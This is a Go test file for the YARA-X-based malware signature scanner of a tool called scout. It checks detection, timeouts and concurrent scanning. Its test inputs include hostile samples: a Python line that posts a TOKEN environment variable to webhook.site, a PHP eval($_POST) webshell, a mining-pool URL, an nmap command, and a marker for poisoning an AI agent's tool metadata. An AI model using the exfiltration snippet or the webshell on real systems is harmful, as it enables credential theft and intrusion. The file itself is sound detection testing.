//go:build !coreonly && cgo

package signatures_test

import (
	"context"
	"fmt"
	"os"
	"reflect"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/skarm/scout/internal/signatures"
)

// These tests require the real linked YARA-X library. No Python fixture or fake
// engine can satisfy them. They are intentionally excluded only by coreonly/!cgo.
func TestRealEmbeddedYARAX(t *testing.T) {
	if !signatures.Backend().Available {
		t.Fatal("native YARA-X build unavailable")
	}
	for _, tc := range []struct {
		name, rules, data, status string
		want                      bool
	}{
		{
			name:   "sentinel",
			rules:  `rule NativeSentinel {meta: category="malware" strings:$s="NATIVE_SENTINEL" condition:$s}`,
			data:   "Привет\x00NATIVE_SENTINEL",
			status: "completed",
			want:   true,
		},
		{name: "safe", rules: "", data: "ordinary text", status: "completed", want: false},
		{
			name:   "builtin",
			rules:  "",
			data:   "import os, requests\nx=os.getenv('TOKEN')\nrequests.post('https://webhook.site/collect',data=x)",
			status: "completed",
			want:   true,
		},
		{
			name:   "cryptominer",
			rules:  "",
			data:   "stratum+tcp://pool.example.invalid:3333",
			status: "completed",
			want:   true,
		},
		{name: "webshell", rules: "", data: "<?php eval($_POST['payload']);", status: "completed", want: true},
		{name: "hacktool", rules: "", data: "nmap -sS example.invalid", status: "completed", want: true},
		{name: "invalid", rules: `rule broken {condition: }`, data: "input", status: "invalid_rules", want: false},
		{name: "include", rules: `include "/etc/passwd"`, data: "input", status: "invalid_rules", want: false},
		{
			name:   "console",
			rules:  `import "console" rule Leak {condition:console.log("secret")}`,
			data:   "input",
			status: "invalid_rules",
			want:   false,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			o := signatures.DefaultOptions()
			o.Enabled = true
			o.ExtraRules = []byte(tc.rules)
			r, e := signatures.Check(context.Background(), []signatures.Input{{
				Path:   "data",
				Data:   tc.data,
				SHA256: digest(tc.data),
			}}, o)
			if e != nil || len(r.Outcomes) != 1 || r.Outcomes[0].Status != tc.status {
				t.Fatalf("%+v %v", r, e)
			}
			if (len(r.Outcomes[0].Matches) > 0) != tc.want {
				t.Fatalf("matches %+v", r.Outcomes[0])
			}
			for _, m := range r.Outcomes[0].Matches {
				for _, s := range m.Spans {
					if s.Start < 0 || s.End > len(tc.data) {
						t.Fatal(s)
					}
				}
			}
		})
	}
}

func TestRealYARAXCancellationAndConcurrentScans(t *testing.T) {
	o := signatures.DefaultOptions()
	o.Enabled = true
	o.Timeout = 500 * time.Millisecond
	r, e := signatures.Check(context.Background(), []signatures.Input{{Path: "x", Data: "x", SHA256: digest("x")}}, o)
	if e != nil || r.Completeness != "complete" || r.Outcomes[0].Status != "completed" {
		t.Fatal(r, e)
	}
	o.Timeout = 3 * time.Second
	var wg sync.WaitGroup
	for range 4 {
		wg.Go(func() {
			r, e := signatures.Check(context.Background(), []signatures.Input{{
				Path:   "x",
				Data:   "benign",
				SHA256: digest("benign"),
			}}, o)
			if e != nil || r.Completeness != "complete" {
				t.Errorf("%+v %v", r, e)
			}
		})
	}
	wg.Wait()
}

// TestRealYARAXRepeatedLoad compares every response with a checked sequential
// result, including offsets, ordering and truncation. Inputs alternate to catch
// persistent-global leakage and scanner reuse faults. Increase rounds for soak.
func TestRealYARAXRepeatedLoad(t *testing.T) {
	rounds := 2
	if value := os.Getenv("SCOUT_YARA_LOAD_ROUNDS"); value != "" {
		parsed, err := strconv.Atoi(value)
		if err != nil || parsed < 1 || parsed > 200 {
			t.Fatal("SCOUT_YARA_LOAD_ROUNDS must be 1..200")
		}
		rounds = parsed
	}
	original, err := os.ReadFile("testdata/yara-load-original.txt")
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		data              string
		poisoned, counted bool
	}{
		{data: string(original), poisoned: true, counted: false},
		{data: "description: ordinary words", poisoned: false, counted: false},
		{data: "description: " + strings.Repeat("x", (1<<20)-13), poisoned: true, counted: false},
		{data: "description: <!--SYSTEM-->\nTOKEN TOKEN", poisoned: true, counted: true},
		{data: "description: TOKEN TOKEN TOKEN", poisoned: false, counted: false},
	}
	options := signatures.DefaultOptions()
	options.Enabled = true
	options.ExtraRules = []byte(`rule Counted { meta: category="malware" strings:$s="TOKEN" condition:#s == 2 and @s[2] > @s[1] }`)
	for _, load := range []struct{ workers, scanners int }{{workers: 1, scanners: 1}, {workers: 4, scanners: 4}, {
		workers:  8,
		scanners: 8,
	}, {
		workers:  16,
		scanners: 16,
	}, {
		workers:  16,
		scanners: 1,
	}} {
		workers := load.workers
		t.Run(fmt.Sprintf("workers-%d-pool-%d", workers, load.scanners), func(t *testing.T) {
			runtime, err := signatures.Open(t.Context(), options, load.scanners)
			if err != nil {
				t.Fatal(err)
			}
			defer func() {
				if err := runtime.Close(); err != nil {
					t.Error(err)
				}
			}()
			inputs := make([][]signatures.Input, len(cases))
			expected := make([]signatures.Report, len(cases))
			for i, tc := range cases {
				inputs[i] = []signatures.Input{{Path: "input.txt", Data: tc.data, SHA256: digest(tc.data)}}
				expected[i], err = runtime.Check(t.Context(), inputs[i])
				if err != nil || len(expected[i].Outcomes) != 1 || expected[i].Outcomes[0].Status != "completed" {
					t.Fatalf("case %d: %+v %v", i, expected[i], err)
				}
				poisoned, counted := false, false
				for _, m := range expected[i].Outcomes[0].Matches {
					poisoned = poisoned || m.Rule == "agent_skill_mcp_tool_poisoning_metadata"
					counted = counted || m.Rule == "Counted"
				}
				if poisoned != tc.poisoned || counted != tc.counted {
					t.Fatalf("case %d: detection mismatch: %+v", i, expected[i])
				}
			}
			start := make(chan struct{})
			times := make([]time.Duration, workers*rounds*len(cases))
			var wg sync.WaitGroup
			at := time.Now()
			for worker := range workers {
				wg.Go(func() {
					<-start
					for round := range rounds {
						for i := range cases {
							before := time.Now()
							got, err := runtime.Check(t.Context(), inputs[i])
							times[(worker*rounds+round)*len(cases)+i] = time.Since(before)
							if err != nil || !reflect.DeepEqual(got, expected[i]) {
								t.Errorf("worker=%d round=%d case=%d: got %+v err=%v want %+v", worker, round, i, got, err, expected[i])
							}
						}
					}
				})
			}
			close(start)
			wg.Wait()
			wall := time.Since(at)
			slices.Sort(times)
			t.Logf("checks=%d wall=%s p50=%s p95=%s p99=%s max=%s", len(times), wall, times[len(times)/2], times[(len(times)-1)*95/100], times[(len(times)-1)*99/100], times[len(times)-1])
		})
	}
}

func TestRealYARAXTimeoutAndScannerRecovery(t *testing.T) {
	options := signatures.DefaultOptions()
	options.Enabled = true
	options.Timeout = 1100 * time.Millisecond
	// A trusted custom rule keeps its original native matching semantics and can
	// still exhaust its budget. The built-in specialization must not rewrite it.
	options.ExtraRules = []byte(`rule SlowOperatorRule {meta:category="malware" strings:$long_base64=/[A-Za-z0-9+\/]{120,}={0,2}/ condition:$long_base64} rule Recovery {meta:category="malware" strings:$s="RECOVERY_SENTINEL" condition:$s}`)
	runtime, err := signatures.Open(t.Context(), options, 1)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := runtime.Close(); err != nil {
			t.Error(err)
		}
	}()
	data := "description: " + strings.Repeat("x", (1<<20)-13)
	report, err := runtime.Check(t.Context(), []signatures.Input{{Path: "slow", Data: data, SHA256: digest(data)}})
	if err != nil || len(report.Outcomes) != 1 || report.Outcomes[0].Status != "deadline" || len(report.Outcomes[0].Matches) != 0 || report.Completeness != "partial" {
		t.Fatalf("native timeout mislabeled: %+v err=%v", report, err)
	}
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	if cancelled, err := runtime.Check(ctx, nil); err == nil || cancelled.Completeness != "partial" {
		t.Fatalf("cancelled check: %+v %v", cancelled, err)
	}
	data = "description: RECOVERY_SENTINEL"
	report, err = runtime.Check(t.Context(), []signatures.Input{{Path: "clean", Data: data, SHA256: digest(data)}})
	if err != nil || len(report.Outcomes) != 1 || report.Outcomes[0].Status != "completed" || report.Completeness != "complete" {
		t.Fatalf("scanner did not recover: %+v %v", report, err)
	}
	if len(report.Outcomes[0].Matches) != 1 || report.Outcomes[0].Matches[0].Rule != "Recovery" {
		t.Fatalf("stale predicate or missing sentinel: %+v", report)
	}
}
